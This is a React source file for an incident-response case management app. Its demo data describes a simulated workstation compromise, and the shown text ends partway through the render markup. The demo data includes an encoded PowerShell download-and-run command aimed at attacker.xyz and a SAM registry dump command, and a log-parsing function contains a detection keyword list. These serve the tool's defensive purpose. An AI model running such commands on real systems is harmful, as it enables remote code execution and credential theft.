import React, { useState, useEffect } from "react";
import LandingPage from "./components/LandingPage";
import Dashboard from "./components/Dashboard";
import CasesPage from "./components/CasesPage";
import EvidenceLocker from "./components/EvidenceLocker";
import NotesEditor from "./components/NotesEditor";
import AttackChain from "./components/AttackChain";
import TimelineBuilder from "./components/TimelineBuilder";
import ReportSystem from "./components/ReportSystem";
import { Case, TimelineEvent, Finding, Evidence, CaseNote, CaseSeverity, CaseStatus } from "./types";
import { 
  Shield, FolderKanban, ClipboardList, 
  Settings, LogOut, Upload, Plus, Sparkles, FolderLock, 
  HelpCircle, Eye, AlertCircle, CheckCircle, Network, HardDrive, FileText, ChevronRight,
  RefreshCw,
  UploadCloud, X, Activity, Check, Lock, Info
} from "lucide-react";

const initialClientDatabase = {
  cases: [
    {
      id: "case-demo-01",
      title: "Operation Frostbite: DevOps Host Compromise",
      description: "An intrusion detection alert triggered by unusual remote PowerShell execution and unauthorized software installation on developer laptop WS-DOE-92.",
      severity: "Critical" as CaseSeverity,
      status: "Investigating" as CaseStatus,
      createdAt: "2026-06-22T08:30:00Z",
    },
    {
      id: "case-demo-02",
      title: "Suspicious API Ingress - Financial Service Gateway",
      description: "An investigation into multiple credential-stuffing attempts resulting in API rate limits being reached on the public payment router ingress.",
      severity: "Medium" as CaseSeverity,
      status: "Open" as CaseStatus,
      createdAt: "2026-06-21T14:15:00Z",
    },
  ],
  events: [
    {
      id: "evt-01",
      caseId: "case-demo-01",
      timestamp: "2026-06-22T09:01:00",
      event: "User Login Success",
      description: "User 'j.doe' successfully authenticated via external VPN IP 198.51.100.42. Historically, logins for this user only originate from local segment 10.12.0.0/16.",
      severity: "Low" as CaseSeverity,
      category: "Initial Access",
      isSuspicious: true,
      notes: "Logins should be restricted to local IP block or corporate proxies. Needs verification with HR relative to travel status.",
      techniqueId: "T1078.001",
      techniqueName: "Valid Accounts: Default Accounts",
    },
    {
      id: "evt-02",
      caseId: "case-demo-01",
      timestamp: "2026-06-22T09:05:00",
      event: "PowerShell Execution",
      description: "PowerShell spawned with arguments: powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAHgAeQB6AC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
      severity: "Critical" as CaseSeverity,
      category: "Execution",
      isSuspicious: true,
      notes: "Decoded base64 payload points to: IEX(New-Object Net.WebClient).DownloadString('http://attacker.xyz/payload.ps1'). This is standard beacon staging behavior.",
      techniqueId: "T1059.001",
      techniqueName: "Command and Scripting Interpreter: PowerShell",
    },
    {
      id: "evt-03",
      caseId: "case-demo-01",
      timestamp: "2026-06-22T09:07:00",
      event: "Suspicious Download",
      description: "Binary download detected from remote URL http://attacker.xyz/binaries/network_scan.exe, saved local to C:\\Users\\Public\\Downloads\\network_scan.exe.",
      severity: "High" as CaseSeverity,
      category: "Command and Control",
      isSuspicious: true,
      notes: "File download matches custom network reconnaissance toolkit payload signatures. MD5 Hash verified as malicious.",
      techniqueId: "T1105",
      techniqueName: "Ingress Tool Transfer",
    },
    {
      id: "evt-04",
      caseId: "case-demo-01",
      timestamp: "2026-06-22T09:11:00",
      event: "Privilege Escalation",
      description: "Command prompt elevated to NT AUTHORITY\\SYSTEM using registry dump helper tool and SAM hives exported as reg save HKLM\\SAM SAM.hiv.",
      severity: "High" as CaseSeverity,
      category: "Credential Access",
      isSuspicious: true,
      notes: "Attempted harvesting of local LSASS security credentials. Attacker succeeded in generating registry structures.",
      techniqueId: "T1003.002",
      techniqueName: "OS Credential Dumping: Security Account Manager",
    },
    {
      id: "evt-05",
      caseId: "case-demo-01",
      timestamp: "2026-06-22T09:15:00",
      event: "Data Exfiltration Attempt",
      description: "High volume outbound transfer of 4.8 GB of sensitive customer source code directories over port 443 HTTPS redirected to cloud storage service mega.co.nz.",
      severity: "Critical" as CaseSeverity,
      category: "Exfiltration",
      isSuspicious: true,
      notes: "The egress channel matches exfiltration signatures. Incident declared. Target workstation has been isolated from network infrastructure.",
      techniqueId: "T1048.003",
      techniqueName: "Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-Web Protocol",
    },
  ],
  evidence: [
    {
      id: "ev-01",
      caseId: "case-demo-01",
      title: "Malicious PowerShell command text snippet",
      fileUrl: "powershell_encoded_payload.txt",
      type: "text/plain",
      size: "348 B",
      uploadedAt: "2026-06-22T09:30:00Z",
      tag: "Indicators",
    },
    {
      id: "ev-02",
      caseId: "case-demo-01",
      title: "DevOps laptop process tree screenshot",
      fileUrl: "ws_doe_process_tree.png",
      type: "image/png",
      size: "1.2 MB",
      uploadedAt: "2026-06-22T09:32:00Z",
      tag: "Screenshots",
    },
  ],
  findings: [
    {
      id: "find-01",
      caseId: "case-demo-01",
      title: "Suspicious PowerShell Execution (Base64)",
      description: "An analyst detected PowerShell command execution utilizing Base64 encoding. It bypassed the default execution policy to directly download and execute remote attacker payload files.",
      severity: "Critical" as CaseSeverity,
      confidence: 95,
      reason: "Matched automated finding rule. High confidence due to encoded command downloading directly from http://attacker.xyz.",
      createdAt: "2026-06-22T09:20:00Z",
      techniqueId: "T1059.001",
    },
    {
      id: "find-02",
      caseId: "case-demo-01",
      title: "OS Credential Registry Harvesting (SAM Export)",
      description: "Exporting Security Account Manager (SAM) registry structures to file system in public access directories was detected, revealing active lateral movement.",
      severity: "High" as CaseSeverity,
      confidence: 88,
      reason: "Attempted execution of reg save on sensitive password storage registry keys.",
      createdAt: "2026-06-22T09:22:00Z",
      techniqueId: "T1003.002",
    },
    {
      id: "find-03",
      caseId: "case-demo-01",
      title: "Mass Corporate Exfiltration to Public Servers",
      description: "An asset sent 4.8 GB of outbound encryption streams towards Mega.co.nz cloud storage infrastructure, outside business bounds.",
      severity: "Critical" as CaseSeverity,
      confidence: 99,
      reason: "Identified via network log matching known file sharing services combined with workstation isolation context.",
      createdAt: "2026-06-22T09:25:00Z",
      techniqueId: "T1048",
    },
  ],
  notes: [
    {
      id: "note-demo-01",
      caseId: "case-demo-01",
      content: `# Operational Incident Response Notes

## 🚨 Current Summary of Workstation WS-DOE-92
At **09:01 AM**, user \`j.doe\` signed in using external credentials. We flagged this because VPN telemetry registers this access from a blacklisted residential proxy block.

At **09:05 AM**, the intruder ran a base64 encoded PowerShell beacon inside our DevOps dev segment, initiating connection download staging towards \`http://attacker.xyz/payload.ps1\`.

## 🛠️ Actions Taken:
1. Isolated workstation WS-DOE-92 immediately using our hypervisor security tools (Virtual LAN Quarantine).
2. Suspended DevOps active domain accounts for \`j.doe\`.
3. Harvested forensic images of local RAM and registries.
4. Traced file download network headers to pinpoint exfiltration channels.

*Note: Large exfiltration events occurred towards mega.co.nz at 09:15 AM. Executive forensics team has been looped in to notify customers of source code directory exposure.*`,
      updatedAt: "2026-06-22T10:00:00Z",
    },
  ],
};

export default function App() {
  const [currentView, setCurrentView] = useState<"landing" | "app">("landing");
  const [appTab, setAppTab] = useState<"dashboard" | "cases" | "workspace">("dashboard");
  const [workspaceSubTab, setWorkspaceSubTab] = useState<"timeline" | "report">("timeline");

  // State management
  const [cases, setCases] = useState<Case[]>([]);
  const [activeCaseId, setActiveCaseId] = useState<string>("case-demo-01");
  const [activeCaseDetails, setActiveCaseDetails] = useState<{
    id: string;
    title: string;
    description: string;
    severity: CaseSeverity;
    status: CaseStatus;
    events: TimelineEvent[];
    evidence: Evidence[];
    findings: Finding[];
    notes: CaseNote;
  } | null>(null);

  const [loadingCases, setLoadingCases] = useState(false);
  const [loadingDetails, setLoadingDetails] = useState(false);
  const [toastMessage, setToastMessage] = useState<{ type: "success" | "info" | "warn"; text: string } | null>(null);
  const [interactiveLogText, setInteractiveLogText] = useState("");
  const [isStaticMode, setIsStaticMode] = useState(false);

  const [ingestionTab, setIngestionTab] = useState<"upload" | "paste">("upload");
  const [uploadDragActive, setUploadDragActive] = useState(false);
  const [lastParsedReport, setLastParsedReport] = useState<{
    fileName: string;
    totalLines: number;
    threatsCount: number;
    compliantCount: number;
    events: any[];
  } | null>(null);

  // Trigger temporary visual toasts
  const triggerToast = (text: string, type: "success" | "info" | "warn" = "success") => {
    setToastMessage({ type, text });
    setTimeout(() => {
      setToastMessage(null);
    }, 4500);
  };

  const getLocalDb = () => {
    const localDbStr = localStorage.getItem("iris_local_db");
    if (!localDbStr) {
      localStorage.setItem("iris_local_db", JSON.stringify(initialClientDatabase));
      return initialClientDatabase;
    }
    try {
      return JSON.parse(localDbStr);
    } catch {
      localStorage.setItem("iris_local_db", JSON.stringify(initialClientDatabase));
      return initialClientDatabase;
    }
  };

  const saveLocalDb = (db: any) => {
    localStorage.setItem("iris_local_db", JSON.stringify(db));
  };

  // 1. Fetch case lists
  const fetchCasesList = async () => {
    setLoadingCases(true);
    try {
      const res = await fetch("/api/cases");
      if (res.ok) {
        const data = await res.json();
        setCases(data);
        setIsStaticMode(false);
      } else {
        throw new Error("API responded non-OK");
      }
    } catch (err) {
      console.warn("Backend API unavailable, loading from local client storage.", err);
      setIsStaticMode(true);
      const db = getLocalDb();
      setCases(db.cases);
    } finally {
      setLoadingCases(false);
    }
  };

  // 2. Fetch specific case details (including child timeline events, findings, notes, evidence)
  const fetchCaseDetails = async (id: string) => {
    setLoadingDetails(true);
    try {
      if (isStaticMode || !id) {
        const db = getLocalDb();
        const caseObj = db.cases.find((c: any) => c.id === id);
        if (caseObj) {
          const events = db.events.filter((e: any) => e.caseId === id);
          const evidence = db.evidence.filter((e: any) => e.caseId === id);
          const findings = db.findings.filter((e: any) => e.caseId === id);
          let notesObj = db.notes.find((n: any) => n.caseId === id);
          if (!notesObj) {
            notesObj = {
              id: `note-${id}`,
              caseId: id,
              content: `# Incident Analysis Notes: ${caseObj.title}\n\nType notes here...`,
              updatedAt: new Date().toISOString()
            };
          }
          setActiveCaseDetails({
            ...caseObj,
            events,
            evidence,
            findings,
            notes: notesObj
          });
        }
        setLoadingDetails(false);
        return;
      }

      const res = await fetch(`/api/cases/${id}`);
      if (res.ok) {
        const data = await res.json();
        setActiveCaseDetails(data);
      } else {
        throw new Error("Detail fetch failed");
      }
    } catch (err) {
      console.error("Error fetching case details", err);
      setIsStaticMode(true);
      const db = getLocalDb();
      const caseObj = db.cases.find((c: any) => c.id === id);
      if (caseObj) {
        const events = db.events.filter((e: any) => e.caseId === id);
        const evidence = db.evidence.filter((e: any) => e.caseId === id);
        const findings = db.findings.filter((e: any) => e.caseId === id);
        let notesObj = db.notes.find((n: any) => n.caseId === id);
        if (!notesObj) {
          notesObj = {
            id: `note-${id}`,
            caseId: id,
            content: `# Incident Analysis Notes: ${caseObj.title}\n\nType notes here...`,
            updatedAt: new Date().toISOString()
          };
        }
        setActiveCaseDetails({
          ...caseObj,
          events,
          evidence,
          findings,
          notes: notesObj
        });
      }
    } finally {
      setLoadingDetails(false);
    }
  };

  // Fetch initial case catalogs
  useEffect(() => {
    fetchCasesList();
  }, []);

  // Hot sync current details whenever active case shifts
  useEffect(() => {
    if (activeCaseId) {
      fetchCaseDetails(activeCaseId);
    }
  }, [activeCaseId]);

  // Handle case switching from selector dropdowns
  const handleCaseSelect = (id: string) => {
    setActiveCaseId(id);
    triggerToast(`Switched active investigation workspace to ${id}`, "info");
  };

  // Load the standard active Active-workstation compromise demo immediately
  const handleLoadDemoCase = () => {
    setCurrentView("app");
    setAppTab("workspace");
    setWorkspaceSubTab("timeline");
    setActiveCaseId("case-demo-01");
    triggerToast("Loaded demonstration Case file Operation Frostbite. Forensics matrices parsed, S3 locker populated.", "success");
  };

  // 3. Create a custom incident
  const handleCreateCase = async (title: string, description: string, severity: CaseSeverity, status: CaseStatus) => {
    try {
      if (isStaticMode) {
        const db = getLocalDb();
        const newCase: Case = {
          id: `case-local-${Date.now()}`,
          title,
          description,
          severity,
          status,
          createdAt: new Date().toISOString()
        };
        db.cases.push(newCase);
        saveLocalDb(db);
        triggerToast(`Incident Case ${newCase.id} created successfully!`, "success");
        await fetchCasesList();
        setActiveCaseId(newCase.id);
        setAppTab("workspace");
        return;
      }

      const res = await fetch("/api/cases", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ title, description, severity, status }),
      });
      if (res.ok) {
        const newCase = await res.json();
        triggerToast(`Incident Case ${newCase.id} created successfully!`, "success");
        await fetchCasesList();
        setActiveCaseId(newCase.id);
        setAppTab("workspace");
      }
    } catch (err) {
      console.error(err);
      triggerToast("Failed to initialize security case", "warn");
    }
  };

  // 4. Update case status / characteristics
  const handleEditCase = async (id: string, updates: Partial<Case>) => {
    try {
      if (isStaticMode) {
        const db = getLocalDb();
        db.cases = db.cases.map((c: any) => c.id === id ? { ...c, ...updates } : c);
        saveLocalDb(db);
        triggerToast("Incident details updated successfully", "success");
        await fetchCasesList();
        if (activeCaseId === id) {
          fetchCaseDetails(id);
        }
        return;
      }

      const res = await fetch(`/api/cases/${id}`, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(updates),
      });
      if (res.ok) {
        triggerToast("Incident details updated successfully", "success");
        await fetchCasesList();
        if (activeCaseId === id) {
          fetchCaseDetails(id);
        }
      }
    } catch (err) {
      console.error(err);
    }
  };

  // 5. Delete specific Case
  const handleDeleteCase = async (id: string) => {
    if (!window.confirm("Are you absolutely sure you want to decommission this investigation case? All related timelines, notes, and evidence will be permanently deleted.")) {
      return;
    }
    try {
      if (isStaticMode) {
        const db = getLocalDb();
        db.cases = db.cases.filter((c: any) => c.id !== id);
        db.events = db.events.filter((e: any) => e.caseId !== id);
        db.findings = db.findings.filter((f: any) => f.caseId !== id);
        db.evidence = db.evidence.filter((ev: any) => ev.caseId !== id);
        db.notes = db.notes.filter((n: any) => n.caseId !== id);
        saveLocalDb(db);
        triggerToast("Case records deleted cleanly", "success");
        await fetchCasesList();
        if (activeCaseId === id) {
          setActiveCaseId("case-demo-01");
        }
        return;
      }

      const res = await fetch(`/api/cases/${id}`, { method: "DELETE" });
      if (res.ok) {
        triggerToast("Case records deleted cleanly from database pools", "success");
        await fetchCasesList();
        // Fall back to demo case or first active item
        if (activeCaseId === id) {
          setActiveCaseId("case-demo-01");
        }
      }
    } catch (err) {
      console.error(err);
    }
  };

  // 6. Append single Timeline Entry
  const handleAddTimelineEvent = async (eventData: Partial<TimelineEvent>) => {
    try {
      if (isStaticMode) {
        const db = getLocalDb();
        const newEvent: TimelineEvent = {
          id: `evt-local-${Date.now()}`,
          caseId: activeCaseId,
          timestamp: eventData.timestamp || new Date().toISOString(),
          event: eventData.event || "Manual Event Indicator",
          description: eventData.description || "",
          severity: eventData.severity || "Low",
          category: eventData.category || "General",
          isSuspicious: eventData.isSuspicious ?? true,
          notes: eventData.notes || "",
          techniqueId: eventData.techniqueId || "",
          techniqueName: eventData.techniqueName || ""
        };
        db.events.push(newEvent);
        
        // Auto-create finding if suspicious & high/critical severity
        if (newEvent.isSuspicious && (newEvent.severity === "High" || newEvent.severity === "Critical")) {
          db.findings.push({
            id: `find-local-${Date.now()}`,
            caseId: activeCaseId,
            title: `Indicator Event: ${newEvent.event}`,
            description: newEvent.description,
            severity: newEvent.severity,
            confidence: 85,
            reason: "Manually registered elevated security event.",
            createdAt: new Date().toISOString(),
            techniqueId: newEvent.techniqueId
          });
        }
        
        saveLocalDb(db);
        triggerToast("Custom event mapped into chronologic sequence", "success");
        fetchCaseDetails(activeCaseId);
        return;
      }

      const res = await fetch(`/api/timeline/${activeCaseId}/events`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(eventData),
      });
      if (res.ok) {
        triggerToast("Custom event mapped into chronologic sequence", "success");
        fetchCaseDetails(activeCaseId);
      }
    } catch (err) {
      console.error(err);
    }
  };

  // 7. Remove single Timeline Entry
  const handleDeleteTimelineEvent = async (eventId: string) => {
    try {
      if (isStaticMode) {
        const db = getLocalDb();
        db.events = db.events.filter((e: any) => e.id !== eventId);
        saveLocalDb(db);
        triggerToast("Timeline node discarded", "info");
        fetchCaseDetails(activeCaseId);
        return;
      }

      const res = await fetch(`/api/timeline/${activeCaseId}/events/${eventId}`, {
        method: "DELETE",
      });
      if (res.ok) {
        triggerToast("Timeline node discarded", "info");
        fetchCaseDetails(activeCaseId);
      }
    } catch (err) {
      console.error(err);
    }
  };

  // 8. Reorder active timeline sequence
  const handleReorderTimeline = async (reorderedEvents: TimelineEvent[]) => {
    // Optimistic UI updates
    setActiveCaseDetails((prev) => {
      if (!prev) return null;
      return {
        ...prev,
        events: reorderedEvents,
      };
    });

    try {
      if (isStaticMode) {
        const db = getLocalDb();
        // Remove old events of this case
        const otherEvents = db.events.filter((e: any) => e.caseId !== activeCaseId);
        db.events = [...otherEvents, ...reorderedEvents];
        saveLocalDb(db);
        return;
      }

      const res = await fetch(`/api/timeline/${activeCaseId}/reorder`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ reorderedEvents }),
      });
      if (!res.ok) {
        throw new Error("Reorder failed on database pools");
      }
    } catch (err) {
      console.error(err);
      triggerToast("Failed to preserve custom chronological sequence", "warn");
      fetchCaseDetails(activeCaseId); // Revert sync
    }
  };

  // 9. Upload Evidence directly to lockers
  const handleUploadEvidence = async (title: string, fileType: string, fileContent: string, tag: string, linkedEventId?: string) => {
    try {
      if (isStaticMode) {
        const db = getLocalDb();
        const newEvidence: Evidence = {
          id: `ev-local-${Date.now()}`,
          caseId: activeCaseId,
          title,
          fileUrl: `${title.toLowerCase().replace(/[^a-z0-9]+/g, "_")}.${fileType === "json" ? "json" : "txt"}`,
          type: fileType === "json" ? "application/json" : "text/plain",
          size: `${Math.round(fileContent.length / 10.24) / 100} KB`,
          uploadedAt: new Date().toISOString(),
          tag,
          linkedEventId
        };
        db.evidence.push(newEvidence);
        saveLocalDb(db);
        triggerToast("Forensic asset uploaded securely to Local Storage Locker", "success");
        fetchCaseDetails(activeCaseId);
        return;
      }

      const res = await fetch("/api/evidence/upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          caseId: activeCaseId,
          title,
          fileType,
          fileContent,
          tag,
          linkedEventId,
        }),
      });
      if (res.ok) {
        triggerToast("Forensic asset uploaded securely mirror to AWS S3 Locker buckets", "success");
        fetchCaseDetails(activeCaseId);
      }
    } catch (err) {
      console.error(err);
    }
  };

  // 10. Empty evidence item
  const handleRemoveEvidence = async (evId: string) => {
    try {
      if (isStaticMode) {
        const db = getLocalDb();
        db.evidence = db.evidence.filter((e: any) => e.id !== evId);
        saveLocalDb(db);
        triggerToast("Forensic evidence asset discarded cleanly", "info");
        fetchCaseDetails(activeCaseId);
        return;
      }

      const res = await fetch(`/api/evidence/${activeCaseId}/${evId}`, {
        method: "DELETE",
      });
      if (res.ok) {
        triggerToast("Forensic evidence asset discarded cleanly", "info");
        fetchCaseDetails(activeCaseId);
      }
    } catch (err) {
      console.error(err);
    }
  };

  // 11. Auto-save written notes
  const handleSaveNotes = async (content: string) => {
    try {
      if (isStaticMode) {
        const db = getLocalDb();
        const existingNoteIdx = db.notes.findIndex((n: any) => n.caseId === activeCaseId);
        if (existingNoteIdx > -1) {
          db.notes[existingNoteIdx].content = content;
          db.notes[existingNoteIdx].updatedAt = new Date().toISOString();
        } else {
          db.notes.push({
            id: `note-local-${Date.now()}`,
            caseId: activeCaseId,
            content,
            updatedAt: new Date().toISOString()
          });
        }
        saveLocalDb(db);
        // Quietly update active state cache
        setActiveCaseDetails((prev) => {
          if (!prev) return null;
          return {
            ...prev,
            notes: {
              ...prev.notes,
              content,
              updatedAt: new Date().toISOString(),
            },
          };
        });
        return;
      }

      const res = await fetch(`/api/notes/${activeCaseId}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content }),
      });
      if (res.ok) {
        // Quietly update active state cache
        setActiveCaseDetails((prev) => {
          if (!prev) return null;
          return {
            ...prev,
            notes: {
              ...prev.notes,
              content,
              updatedAt: new Date().toISOString(),
            },
          };
        });
      }
    } catch (err) {
      console.error(err);
    }
  };

  const parseLogsClientSide = (content: string) => {
    const lines = content.split("\n");
    const parsedEvents: any[] = [];
    
    // Simple line-by-line parsing
    lines.forEach((line, index) => {
      if (!line.trim()) return;
      const lower = line.toLowerCase();
      let event = "Log Event Node";
      let description = line.trim();
      let severity: CaseSeverity = "Low";
      let category = "Security Check";
      let isSuspicious = false;
      let techniqueId = "";
      let techniqueName = "";
      
      if (lower.includes("powershell") || lower.includes("bypass") || lower.includes("-enc")) {
        event = "Suspicious PowerShell Execution";
        isSuspicious = true;
        severity = "Critical";
        category = "Execution";
        techniqueId = "T1059.001";
        techniqueName = "PowerShell Scripting";
      } else if (lower.includes("bad password") || lower.includes("failure") || lower.includes("unauthorized") || lower.includes("denied")) {
        event = "Access Authentication Failure";
        isSuspicious = true;
        severity = "High";
        category = "Credential Access";
        techniqueId = "T1110";
        techniqueName = "Brute Force";
      } else if (lower.includes("elevat") || lower.includes("privilege") || lower.includes("sam.hiv") || lower.includes("registry dump")) {
        event = "Privilege Escalation Alert";
        isSuspicious = true;
        severity = "High";
        category = "Privilege Escalation";
        techniqueId = "T1003.002";
        techniqueName = "OS Credential Dumping";
      } else if (lower.includes("download") || lower.includes("wget") || lower.includes("curl") || lower.includes("attacker.xyz")) {
        event = "Suspicious File Transfer";
        isSuspicious = true;
        severity = "High";
        category = "Command and Control";
        techniqueId = "T1105";
        techniqueName = "Ingress Tool Transfer";
      } else if (lower.includes("mega.co.nz") || lower.includes("exfil") || lower.includes("leak") || lower.includes("outbound")) {
        event = "Data Exfiltration Attempt";
        isSuspicious = true;
        severity = "Critical";
        category = "Exfiltration";
        techniqueId = "T1048";
        techniqueName = "Exfiltration Over Alternative Protocol";
      } else if (lower.includes("success") || lower.includes("mfa verified") || lower.includes("authorized check")) {
        event = "User Login Verification";
        isSuspicious = false;
        severity = "Low";
        category = "Initial Access";
      }

      parsedEvents.push({
        id: `evt-client-${Date.now()}-${index}`,
        caseId: activeCaseId,
        timestamp: new Date().toISOString().substring(0, 19).replace("T", " "),
        event,
        description,
        severity,
        category,
        isSuspicious,
        techniqueId,
        techniqueName,
        notes: isSuspicious ? "Flagged by client-side heuristic engines during static processing." : "Verified compliant under static parsing."
      });
    });
    
    return parsedEvents;
  };

  // 12. Sandbox Log Ingestion handler
  const handleQuickInject = async (logType: string) => {
    let mockContent = "";
    let fName = "security_isolated_syslog.txt";

    if (logType === "bruteforce") {
      fName = "active_directory_bruteforce.txt";
      mockContent = `
        22:15:01 AD_AUTH_FAILURE IP=198.51.100.12 user=administrator - reason="bad password"
        22:15:03 AD_AUTH_FAILURE IP=198.51.100.12 user=administrator - reason="bad password"
        22:15:04 AD_AUTH_FAILURE IP=198.51.100.12 user=administrator - reason="bad password"
        22:15:07 AD_AUTH_FAILURE IP=198.51.100.12 user=administrator - reason="bad password"
        22:15:09 AD_AUTH_FAILURE IP=198.51.100.12 user=administrator - reason="bad password"
        22:15:10 AD_AUTH_FAILURE IP=198.51.100.12 user=administrator - reason="bad password"
      `.trim();
    } else if (logType === "ransomware") {
      fName = "firewall_endpoint_alerts.json";
      mockContent = JSON.stringify([
        {
          timestamp: new Date().toISOString().substring(0, 19),
          event: "Suspicious Remote Download",
          description: "Wget trigger detected downloading payload from attacker.xyz/trojan_pack.exe",
          severity: "High",
          category: "Command and Control"
        },
        {
          timestamp: new Date(Date.now() + 100000).toISOString().substring(0, 19),
          event: "Trojan Executable Downloaded",
          description: "Malicious binary trojan_pack.exe unpacked in local temp user registry.",
          severity: "Critical",
          category: "Execution"
        }
      ], null, 2);
    }

    if (isStaticMode) {
      const parsed = parseLogsClientSide(mockContent);
      const db = getLocalDb();
      db.events = [...db.events, ...parsed];
      
      // Auto-add findings for suspicious logs
      parsed.filter(p => p.isSuspicious).forEach(p => {
        db.findings.push({
          id: `find-local-${Date.now()}-${Math.random()}`,
          caseId: activeCaseId,
          title: `Alert: ${p.event}`,
          description: p.description,
          severity: p.severity,
          confidence: 90,
          reason: "Log ingestion heuristic match.",
          createdAt: new Date().toISOString(),
          techniqueId: p.techniqueId
        });
      });

      saveLocalDb(db);
      triggerToast(`Quick logs loaded! Processed and added ${parsed.length} milestones client-side.`, "success");
      fetchCaseDetails(activeCaseId);
      return;
    }

    try {
      const res = await fetch("/api/logs/upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          caseId: activeCaseId,
          fileName: fName,
          fileContent: mockContent,
          fileType: fName.endsWith(".json") ? "json" : "txt"
        }),
      });

      if (res.ok) {
        const data = await res.json();
        triggerToast(data.message, "success");
        fetchCaseDetails(activeCaseId);
      }
    } catch (err) {
      console.error(err);
      triggerToast("Log Injection failed on server interface", "warn");
    }
  };

  // manual typing text log ingestion submitter
  const handleManualLogIngestSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!interactiveLogText.trim()) return;

    if (isStaticMode) {
      const parsed = parseLogsClientSide(interactiveLogText);
      const db = getLocalDb();
      db.events = [...db.events, ...parsed];

      parsed.filter(p => p.isSuspicious).forEach(p => {
        db.findings.push({
          id: `find-local-${Date.now()}-${Math.random()}`,
          caseId: activeCaseId,
          title: `Pasted Alert: ${p.event}`,
          description: p.description,
          severity: p.severity,
          confidence: 80,
          reason: "Manual paste heuristic analyzer flag.",
          createdAt: new Date().toISOString(),
          techniqueId: p.techniqueId
        });
      });

      saveLocalDb(db);
      const threats = parsed.filter((ev: any) => ev.isSuspicious) || [];
      const compliant = parsed.filter((ev: any) => !ev.isSuspicious) || [];
      setLastParsedReport({
        fileName: "forensics_analyst_pasted_lines.txt",
        totalLines: parsed.length,
        threatsCount: threats.length,
        compliantCount: compliant.length,
        events: parsed
      });

      triggerToast(`Processed locally. Analyzed ${parsed.length} lines.`, "success");
      setInteractiveLogText("");
      fetchCaseDetails(activeCaseId);
      return;
    }

    try {
      const res = await fetch("/api/logs/upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          caseId: activeCaseId,
          fileName: "forensics_analyst_pasted_lines.txt",
          fileContent: interactiveLogText,
          fileType: "txt",
        }),
      });

      if (res.ok) {
        const data = await res.json();
        const threats = data.events?.filter((ev: any) => ev.isSuspicious) || [];
        const compliant = data.events?.filter((ev: any) => !ev.isSuspicious) || [];
        setLastParsedReport({
          fileName: "forensics_analyst_pasted_lines.txt",
          totalLines: (data.events?.length || 0),
          threatsCount: threats.length,
          compliantCount: compliant.length,
          events: data.events || []
        });
        triggerToast(`Manual paste processed successfully. Enrolled ${data.events?.length || 0} event milestones!`, "success");
        setInteractiveLogText("");
        fetchCaseDetails(activeCaseId);
      }
    } catch (err) {
      console.error(err);
      triggerToast("Manual text parse operation failed.", "warn");
    }
  };

  const handleLogFileUpload = async (fileName: string, content: string) => {
    if (!content.trim()) return;

    if (isStaticMode) {
      const parsed = parseLogsClientSide(content);
      const db = getLocalDb();
      db.events = [...db.events, ...parsed];

      parsed.filter(p => p.isSuspicious).forEach(p => {
        db.findings.push({
          id: `find-local-${Date.now()}-${Math.random()}`,
          caseId: activeCaseId,
          title: `File Alert: ${p.event}`,
          description: p.description,
          severity: p.severity,
          confidence: 85,
          reason: "Log file heuristic parsing trigger.",
          createdAt: new Date().toISOString(),
          techniqueId: p.techniqueId
        });
      });

      saveLocalDb(db);
      const threats = parsed.filter((ev: any) => ev.isSuspicious) || [];
      const compliant = parsed.filter((ev: any) => !ev.isSuspicious) || [];
      setLastParsedReport({
        fileName,
        totalLines: parsed.length,
        threatsCount: threats.length,
        compliantCount: compliant.length,
        events: parsed
      });

      triggerToast(`Log file "${fileName}" processed locally via offline engine.`, "success");
      fetchCaseDetails(activeCaseId);
      return;
    }

    try {
      const res = await fetch("/api/logs/upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          caseId: activeCaseId,
          fileName,
          fileContent: content,
          fileType: fileName.endsWith(".json") ? "json" : "txt"
        }),
      });

      if (res.ok) {
        const data = await res.json();
        const threats = data.events?.filter((ev: any) => ev.isSuspicious) || [];
        const compliant = data.events?.filter((ev: any) => !ev.isSuspicious) || [];
        setLastParsedReport({
          fileName,
          totalLines: (data.events?.length || 0),
          threatsCount: threats.length,
          compliantCount: compliant.length,
          events: data.events || []
        });
        triggerToast(`Log file "${fileName}" processed successfully.`, "success");
        fetchCaseDetails(activeCaseId);
      } else {
        triggerToast("Failed to process the uploaded file.", "warn");
      }
    } catch (err) {
      console.error(err);
      triggerToast("Network error uploading log file.", "warn");
    }
  };

  // Render main portal view
  if (currentView === "landing") {
    return <LandingPage onStart={() => setCurrentView("app")} onLoadDemo={handleLoadDemoCase} />;
  }

  const activeCaseObj = cases.find(c => c.id === activeCaseId) || cases[0];

  return (
    <div className="min-h-screen bg-zinc-50/50 font-sans text-slate-800 flex flex-col antialiased select-none">
      
      {/* Toast Notice bar */}
      {toastMessage && (
        <div id="iris-global-toast" className={`fixed bottom-6 right-6 z-50 p-4 rounded-xl shadow-lg border text-xs font-semibold max-w-sm flex items-center gap-3 transition-all duration-300 transform translate-y-0 pulse-soft ${
          toastMessage.type === "success" ? "bg-emerald-50 text-emerald-950 border-emerald-200" :
          toastMessage.type === "warn" ? "bg-red-50 text-red-950 border-red-200" : "bg-violet-50 text-violet-950 border-violet-200"
        }`}>
          {toastMessage.type === "success" && <CheckCircle className="h-4 w-4 text-emerald-600 flex-shrink-0" />}
          {toastMessage.type === "warn" && <AlertCircle className="h-4 w-4 text-rose-600 flex-shrink-0" />}
